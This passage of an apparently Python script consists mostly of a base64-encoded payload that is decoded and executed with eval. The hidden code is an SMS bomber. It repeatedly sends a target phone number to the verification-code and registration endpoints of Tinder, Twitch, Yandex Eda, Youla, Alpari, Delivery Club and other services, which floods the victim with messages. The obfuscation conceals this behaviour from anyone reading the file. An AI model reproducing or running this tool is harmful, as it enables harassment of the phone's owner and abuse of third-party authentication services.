50KCdbK10gUGxpbmsg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL3FsZWFuLnJ1L2NsaWVudHMtYXBpL3YyL3Ntc19jb2Rlcy9hdXRoL3JlcXVlc3RfY29kZSIsanNvbj17InBob25lIjogX3Bob25lfSkNCgkJcHJpbnQoJ1srXSBxbGVhbiDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoImh0dHA6Ly9zbXNnb3JvZC5ydS9zZW5kc21zLnBocCIsZGF0YT17Im51bWJlciI6IF9waG9uZX0pDQoJCXByaW50KCdbK10gU01TZ29yb2Qg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwaS5nb3RpbmRlci5jb20vdjIvYXV0aC9zbXMvc2VuZD9hdXRoX3R5cGU9c21zJmxvY2FsZT1ydScsZGF0YT17J3Bob25lX251bWJlcic6IF9waG9uZX0pDQoJCXByaW50KCdbK10gVGluZGVyINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9wYXNzcG9ydC50d2l0Y2gudHYvcmVnaXN0ZXI/dHJ1c3RlZF9yZXF1ZXN0PXRydWUnLGpzb249eyJiaXJ0aGRheSI6IHsiZGF5IjogMTEsICJtb250aCI6IDExLCAieWVhciI6IDE5OTl9LCJjbGllbnRfaWQiOiAia2QxdW5iNGIzcTR0NThmd2xwY2J6Y2JubTc2YThmcCIsICJpbmNsdWRlX3ZlcmlmaWNhdGlvbl9jb2RlIjogVHJ1ZSwicGFzc3dvcmQiOiBwYXNzd29yZCwgInBob25lX251bWJlciI6IF9waG9uZSwidXNlcm5hbWUiOiB1c2VybmFtZX0pDQoJCXByaW50KCdbK10gVHdpdGNoINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9jYWJpbmV0LndpLWZpLnJ1L2FwaS9hdXRoL2J5LXNtcycsIGRhdGE9eydtc2lzZG4nOiBfcGhvbmV9LGhlYWRlcnM9eydBcHAtSUQnOiAnY2FiaW5ldCd9KQ0KCQlwcmludCgnWytdIENhYldpRmkg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2FwaS53b3d3b3Jrcy5ydS92Mi9zaXRlL3NlbmQtY29kZSIsanNvbj17InBob25lIjogX3Bob25lLCAidHlwZSI6IDJ9KQ0KCQlwcmludCgnWytdIHdvd3dvcmtzINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9lZGEueWFuZGV4L2FwaS92MS91c2VyL3JlcXVlc3RfYXV0aGVudGljYXRpb25fY29kZScsanNvbj17InBob25lX251bWJlciI6ICIrIiArIF9waG9uZX0pDQoJCXByaW50KCdbK10gRWRhLllhbmRleCDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8veW91bGEucnUvd2ViLWFwaS9hdXRoL3JlcXVlc3RfY29kZScsIGRhdGE9eydwaG9uZSc6IF9waG9uZX0pDQoJCXByaW50KCdbK10gWW91bGEg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FscGFyaS5jb20vYXBpL3J1L3Byb3RlY3Rpb24vZGVsaXZlci8yZjE3OGIxNzk5MGNhNGI3OTAzYWE4MzRiOWY1NGMyYzBiY2IwMWEyLycsanNvbj17ImNsaWVudF90eXBlIjogInBlcnNvbmFsIiwgImVtYWlsIjogZiJ7ZW1haWx9QGdtYWlsLnJ1IiwibW9iaWxlX3Bob25lIjogX3Bob25lLCAiZGVsaXZlcnlPcHRpb24iOiAic21zIn0pDQoJCXByaW50KCdbK10gQWxwYXJpINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9hcGktcHJpbWUuYW55dGltZS5nbG9iYWwvYXBpL3YyL2F1dGgvc2VuZFZlcmlmaWNhdGlvbkNvZGUiLGRhdGE9eyJwaG9uZSI6IF9waG9uZX0pDQoJCXByaW50KCdbK10gU01TINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINC90LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuZGVsaXZlcnktY2x1Yi5ydS9hamF4L3VzZXJfb3RwJywgZGF0YT17InBob25lIjogX3Bob25lfSkNCgkJcHJpbnQoJ1srXSBEZWxpdmVyeSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCg0KDQoJdHJ5Og0KCQlpdGVyYXRpb24gKz0gMQ0KCQlwcmludCgoJ3t9INC60YDRg9CzINC/0YDQvtC50LTQtdC9LicpLmZvcm1hdChpdGVyYXRpb24pKQ0KCWV4Y2VwdDoNCgkJYnJlYWs=
"""
eval(compile(base64.b64decode(myscript),'<string>','exec'))